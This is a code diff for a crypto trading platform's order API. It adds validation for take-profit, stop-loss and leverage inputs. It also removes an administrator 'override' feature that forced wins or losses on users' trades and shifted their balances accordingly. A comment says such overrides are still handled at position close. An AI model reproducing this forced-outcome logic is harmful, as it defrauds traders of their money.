@@ -19,30 +19,6 @@ async function ensureBalance(supabase: any, userId: string, asset: string) {
   return created
 }
 
-async function getActiveOverride(supabase: any, userId: string, pair: string) {
-  // Check for pair-specific override first
-  const { data: specific } = await supabase
-    .from("trade_overrides")
-    .select("*")
-    .eq("user_id", userId)
-    .eq("pair", pair)
-    .eq("active", true)
-    .limit(1)
-    .single()
-  if (specific) return specific
-
-  // Check for global override (null pair)
-  const { data: global } = await supabase
-    .from("trade_overrides")
-    .select("*")
-    .eq("user_id", userId)
-    .is("pair", null)
-    .eq("active", true)
-    .limit(1)
-    .single()
-  return global || null
-}
-
 /* ---------- GET ---------- */
 export async function GET(request: NextRequest) {
   const supabase = await createClient()
@@ -239,6 +215,11 @@ export async function POST(request: NextRequest) {
   const takeProfit = Number(take_profit) > 0 && Number.isFinite(Number(take_profit)) ? Number(take_profit) : null
   const stopLoss = Number(stop_loss) > 0 && Number.isFinite(Number(stop_loss)) ? Number(stop_loss) : null
 
+  if ((take_profit != null && take_profit !== "" && takeProfit === null) ||
+      (stop_loss != null && stop_loss !== "" && stopLoss === null)) {
+    return NextResponse.json({ error: "Take-profit and stop-loss must be positive prices." }, { status: 400 })
+  }
+
   const baseAsset = pair.split("/")[0]
   const quoteAsset = pair.split("/")[1]
   const marketPrice = await getLivePrice(baseAsset, pair)
@@ -254,11 +235,35 @@ export async function POST(request: NextRequest) {
   // Leveraged Futures orders are handled in a completely separate path (real
   // margin, liquidation price, and funding) so the Spot logic below is never
   // touched or put at risk by this.
+  if (takeProfit !== null || stopLoss !== null) {
+    // TP/SL must be on the correct side of the current market and match the
+    // position direction. Reject invalid levels rather than storing orders
+    // that can trigger immediately or on the wrong side.
+    const isShortPosition = is_futures && side === "sell"
+    if (is_futures || side === "buy") {
+      if (takeProfit !== null && (isShortPosition ? takeProfit >= marketPrice : takeProfit <= marketPrice)) {
+        return NextResponse.json({ error: isShortPosition ? "Short take-profit must be below the current market price." : "Take-profit must be above the current market price." }, { status: 400 })
+      }
+      if (stopLoss !== null && (isShortPosition ? stopLoss <= marketPrice : stopLoss >= marketPrice)) {
+        return NextResponse.json({ error: isShortPosition ? "Short stop-loss must be above the current market price." : "Stop-loss must be below the current market price." }, { status: 400 })
+      }
+    } else {
+      return NextResponse.json({ error: "Spot TP/SL is supported for buy positions only. Use Futures for short-position TP/SL." }, { status: 400 })
+    }
+  }
+
   if (is_futures) {
+    const leverageValue = Number(leverage)
+    if (!Number.isFinite(leverageValue) || leverageValue < 1 || leverageValue > 125) {
+      return NextResponse.json({ error: "Leverage must be between 1x and 125x." }, { status: 400 })
+    }
+    if (order_type === "stop_limit") {
+      return NextResponse.json({ error: "Futures stop-limit orders are not supported yet. Use Market or a marketable Limit order." }, { status: 400 })
+    }
     return handleFuturesOrder({
       adminSupabase, userId: user.id, userEmail: user.email || "unknown",
       pair, side, order_type, price, amount, marketPrice,
-      leverage: Math.max(1, Math.min(125, Number(leverage) || 1)),
+      leverage: leverageValue,
       takeProfit, stopLoss, baseAsset, quoteAsset, durationSeconds,
     })
   }
@@ -333,10 +338,9 @@ export async function POST(request: NextRequest) {
 
     if (orderErr) return NextResponse.json({ error: orderErr.message }, { status: 500 })
 
-    // Check for admin override
-    const override = await getActiveOverride(adminSupabase, user.id, pair)
-
-    // Calculate P&L for sells (or any trade with override)
+    // Calculate P&L from the actual entry/exit prices. Administrative
+    // overrides are handled at position close and must not silently alter
+    // entry-time balances or P&L.
     let pnl = 0
     if (side === "sell") {
       const { data: prevBuys } = await adminSupabase
@@ -352,25 +356,6 @@ export async function POST(request: NextRequest) {
         const avgBuyPrice = prevBuys.reduce((s, b) => s + Number(b.price) * Number(b.amount), 0) /
           prevBuys.reduce((s, b) => s + Number(b.amount), 0)
         pnl = (execPrice - avgBuyPrice) * amount - fee
-      }
-    }
-
-    // Apply override to P&L and settlement
-    let overrideApplied = false
-    let settlementAdjustment = 0
-    if (override) {
-      overrideApplied = true
-      const mult = override.multiplier ?? 1.0
-      if (override.forced_result === "loss") {
-        // Force a loss: user loses a percentage of their trade total
-        const lossAmount = total * mult * 0.1 // 10% * multiplier of trade value
-        pnl = -Math.abs(lossAmount)
-        settlementAdjustment = -Math.abs(lossAmount)
-      } else if (override.forced_result === "win") {
-        // Force a win: user gains a percentage of their trade total
-        const winAmount = total * mult * 0.05 // 5% * multiplier of trade value
-        pnl = Math.abs(winAmount)
-        settlementAdjustment = Math.abs(winAmount)
       }
     }
 
@@ -400,7 +385,7 @@ export async function POST(request: NextRequest) {
       // Deduct quote
       const qBal = await ensureBalance(adminSupabase, user.id, quoteAsset)
       await adminSupabase.from("balances").update({
-        available: Math.max(0, qBal.available - total - fee + settlementAdjustment),
+        available: Math.max(0, qBal.available - total - fee),
         updated_at: new Date().toISOString()
       }).eq("user_id", user.id).eq("asset", quoteAsset)
 
@@ -418,15 +403,15 @@ export async function POST(request: NextRequest) {
         updated_at: new Date().toISOString()
       }).eq("user_id", user.id).eq("asset", baseAsset)
 
-      // Credit quote (with settlement adjustment from override)
+      // Credit quote proceeds at the actual execution price
       const qBal = await ensureBalance(adminSupabase, user.id, quoteAsset)
       await adminSupabase.from("balances").update({
-        available: Math.max(0, qBal.available + total - fee + settlementAdjustment),
+        available: Math.max(0, qBal.available + total - fee),
         updated_at: new Date().toISOString()
       }).eq("user_id", user.id).eq("asset", quoteAsset)
     }
 
-    const tradeMsg = `${side === "buy" ? "Bought" : "Sold"} ${amount} ${baseAsset} @ $${Number(execPrice).toLocaleString()} | Fee: $${fee.toFixed(2)}${pnl !== 0 ? ` | P&L: ${pnl >= 0 ? "+" : ""}$${pnl.toFixed(2)}` : ""}${overrideApplied ? " [Override Applied]" : ""}`
+    const tradeMsg = `${side === "buy" ? "Bought" : "Sold"} ${amount} ${baseAsset} @ $${Number(execPrice).toLocaleString()} | Fee: $${fee.toFixed(2)}${pnl !== 0 ? ` | P&L: ${pnl >= 0 ? "+" : ""}$${pnl.toFixed(2)}` : ""}`
 
     notifyAdmin({
       subject: `Trade - ${side.toUpperCase()} ${amount} ${baseAsset}`,
